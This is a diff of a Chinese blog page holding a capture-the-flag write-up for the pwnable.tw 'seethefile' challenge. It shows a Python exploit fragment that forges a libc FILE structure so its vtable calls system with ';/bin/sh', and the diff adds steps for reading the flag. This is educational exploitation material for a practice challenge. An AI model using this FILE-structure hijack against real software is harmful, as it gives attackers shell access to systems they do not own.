@@ -204,6 +204,12 @@ var _hmt = _hmt || [];
 <h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>因为可以直接读文件，所以<code>/proc/id(self)/maps</code>可以直接读</p>
 <h3 id="伪造IO-FILE结构"><a href="#伪造IO-FILE结构" class="headerlink" title="伪造IO FILE结构"></a>伪造IO FILE结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fakeFILE = <span class="number">0x0804B284</span><span class="comment">#伪造的地址</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">name += p32(fakeFILE)<span class="comment">#FILE的地址</span></span><br><span class="line"></span><br><span class="line">FILE = p32(<span class="number">0xffffdfff</span>)<span class="comment">#绕过验证</span></span><br><span class="line">FILE += <span class="string">";/bin/sh"</span><span class="comment">#参数，因为不是地址，故可以前面加;或者||直接填</span></span><br><span class="line">FILE = FILE.ljust(<span class="number">0x94</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">name += FILE</span><br><span class="line">name += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">name += p32(system)*<span class="number">3</span><span class="comment">#vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd home</span><br><span class="line">cd seethefile</span><br></pre></td></tr></table></figure>
+
+<p>下面有这些文件</p>
+<p><img src="/2021/02/25/pwnable-tw-9-16%E9%A2%98/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210225185641105.png" alt="image-20210225185641105"></p>
+<p>执行get_flag可以获得，查看源码可得需要输入字符串<code>Give me the flag</code></p>
+<p><img src="/2021/02/25/pwnable-tw-9-16%E9%A2%98/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210225185601647.png" alt="image-20210225185601647"></p>
 <p>参考：</p>
 <ul>
 <li><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/" target="_blank" rel="noopener">pwnable.tw系列</a></li>
@@ -218,7 +224,8 @@ var _hmt = _hmt || [];
 
     
     
-    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    <a href="/2021/03/05/ctf常用快捷键/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
